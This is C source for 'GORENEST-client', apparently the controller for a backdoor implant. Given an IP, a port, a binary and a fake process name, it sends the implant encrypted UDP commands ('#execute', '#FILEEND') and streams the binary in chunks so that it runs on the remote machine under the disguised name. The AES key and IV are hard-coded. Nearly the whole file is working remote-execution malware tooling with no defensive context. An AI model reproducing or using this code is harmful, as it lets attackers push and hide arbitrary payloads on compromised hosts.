#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/types.h>
#define PORT 44444
#define MAX 2048 
#define MAX_ENC 2064
#define SA struct sockaddr 

unsigned char *key = (unsigned char *)"kXMYK0nLhhqkCRwTbg5Fhvok2ANsTiWV";
unsigned char *iv = (unsigned char *)"5SmGalZA9FZJ7cij";

void handleErrors(void)
{
    ERR_print_errors_fp(stderr);
    abort();
}

int encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key,
            unsigned char *iv, unsigned char *ciphertext)
{
    EVP_CIPHER_CTX *ctx;

    int len;

    int ciphertext_len;

    /* Create and initialise the context */
    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();

    /*
     * Initialise the encryption operation. IMPORTANT - ensure you use a key
     * and IV size appropriate for your cipher
     * In this example we are using 256 bit AES (i.e. a 256 bit key). The
     * IV size for *most* modes is the same as the block size. For AES this
     * is 128 bits
     */
    if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    /*
     * Provide the message to be encrypted, and obtain the encrypted output.
     * EVP_EncryptUpdate can be called multiple times if necessary
     */
    if(1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len))
        handleErrors();
    ciphertext_len = len;
    /*
     * Finalise the encryption. Further ciphertext bytes may be written at
     * this stage.
     */
    if(1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len))
        handleErrors();
    ciphertext_len += len;
    /* Clean up */
    EVP_CIPHER_CTX_free(ctx);

    return ciphertext_len;
}

int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key,
            unsigned char *iv, unsigned char *plaintext)
{
    EVP_CIPHER_CTX *ctx;

    int len;

    int plaintext_len;

    /* Create and initialise the context */
    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();

    /*
     * Initialise the decryption operation. IMPORTANT - ensure you use a key
     * and IV size appropriate for your cipher
     * In this example we are using 256 bit AES (i.e. a 256 bit key). The
     * IV size for *most* modes is the same as the block size. For AES this
     * is 128 bits
     */
    if(1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    /*
     * Provide the message to be decrypted, and obtain the plaintext output.
     * EVP_DecryptUpdate can be called multiple times if necessary.
     */
    if(1 != EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len))
        handleErrors();
    plaintext_len = len;

    /*
     * Finalise the decryption. Further plaintext bytes may be written at
     * this stage.
     */
    if(1 != EVP_DecryptFinal_ex(ctx, plaintext + len, &len))
        handleErrors();
    plaintext_len += len;

    /* Clean up */
    EVP_CIPHER_CTX_free(ctx);

    return plaintext_len;
}

int main(int argc, char * argv[])
{
	if(strncmp(argv[1], "--help", 6) == 0 | strncmp(argv[1], "-h", 2) == 0)
        {
		printf("GORENEST-client <ip> <port> <binary to upload and execute> \"<PROCESS NAME FOR BINARY>\"\n");
		exit(1);
	}
	if(argc != 5)
        {
                printf("Not enough Arguments! Please use GORENEST-client -h or GORENEST-client --help for options!\n");
                exit(1);
        }

	int sockfd; 
   	unsigned char buff[MAX];
	unsigned char enc_buff[MAX_ENC]; 
    	char *execute = "#execute"; 
    	struct sockaddr_in     servaddr;
	int new_port;
	char * ip_address = argv[1];
	char * cport = argv[2];
	char * payload = argv[3];
	char * new_name = argv[4];
  	FILE * file_to_execute;
	long execute_length;
	char execute_clength[50];
	
	new_port = atoi(cport);
	printf("%s\n", new_name);
    // Creating socket file descriptor 
    	if ( (sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) { 
        	perror("socket creation failed"); 
        	exit(EXIT_FAILURE); 
    	} 
  
    	memset(&servaddr, 0, sizeof(servaddr)); 
      
    // Filling server information 
    	servaddr.sin_family = AF_INET; 
    	servaddr.sin_port = htons(new_port); 
    	servaddr.sin_addr.s_addr = inet_addr(ip_address); 
      	if(connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) 
	{
		printf("Failed, exiting\n");
		exit(1);	
	}
	else
	{
		printf("Connected!\n");
	}
    	int n, len, count; 
	file_to_execute = fopen(payload, "r");
	if(file_to_execute == NULL)
	{
		printf("Failed to open payload for reading!\n");
		close(sockfd);
		exit(1);
	}
	fseek(file_to_execute, 0, SEEK_END);
	execute_length = ftell(file_to_execute);
	rewind(file_to_execute);
	fseek(file_to_execute, 0, SEEK_SET);
	sprintf(execute_clength, "%ld", execute_length);
      	bzero(buff, MAX);
	bzero(enc_buff, MAX_ENC);
	strcpy(buff, execute);
	strcat(buff, " ");
	strcat(buff, execute_clength);
	strcat(buff, "\n");
	encrypt(buff, MAX, key, iv, enc_buff);		
    	sendto(sockfd, (const char *)enc_buff, MAX_ENC, MSG_CONFIRM, (const struct sockaddr *) &servaddr, sizeof(servaddr));
	 
    	printf("Hello message sent.\n");
	bzero(buff, MAX);
        bzero(enc_buff, MAX_ENC);
 	strcpy(buff, new_name);
	strcat(buff, "\n");
	encrypt(buff, MAX, key, iv, enc_buff);
	sendto(sockfd, (const char *)enc_buff, MAX_ENC, MSG_CONFIRM, (const struct sockaddr *) &servaddr, sizeof(servaddr));

        bzero(buff, MAX);
	bzero(enc_buff, MAX_ENC);  
    	n = recvfrom(sockfd, (char *)enc_buff, MAX_ENC, MSG_WAITALL, (struct sockaddr *) &servaddr, &len);
	decrypt(enc_buff, MAX_ENC, key, iv, buff);
	if(strncmp(buff, "#send", 5) == 0)
	{
		bzero(buff, MAX);
		bzero(enc_buff, MAX_ENC);
		count = 0;
		while(1)
		{
			usleep(1);
			if((count+MAX) < execute_length)
			{
				fread(buff, sizeof(char), MAX, file_to_execute);
                                encrypt(buff, MAX, key, iv, enc_buff);
				sendto(sockfd, (const char *)enc_buff, MAX_ENC, MSG_CONFIRM, (const struct sockaddr *) &servaddr, sizeof(servaddr));
				bzero(buff, MAX);
                                bzero(enc_buff, MAX_ENC);
                                count += MAX;
			}
			else
			{
				fread(buff, sizeof(char), (execute_length - count), file_to_execute);
				encrypt(buff, MAX, key, iv, enc_buff);
				sendto(sockfd, (const char *)enc_buff, MAX_ENC, MSG_CONFIRM, (const struct sockaddr *) &servaddr, sizeof(servaddr));
                                bzero(buff, MAX);
                                bzero(enc_buff, MAX_ENC);
				break;
			}
			
		}
		strcpy(buff, "#FILEEND");
		encrypt(buff, MAX, key, iv, enc_buff);
		sendto(sockfd, (const char *)enc_buff, MAX_ENC, MSG_CONFIRM, (const struct sockaddr *) &servaddr, sizeof(servaddr));
		printf("File sent and should be executing now.\n");
	} 
    	close(sockfd); 
    	return 0; 
}
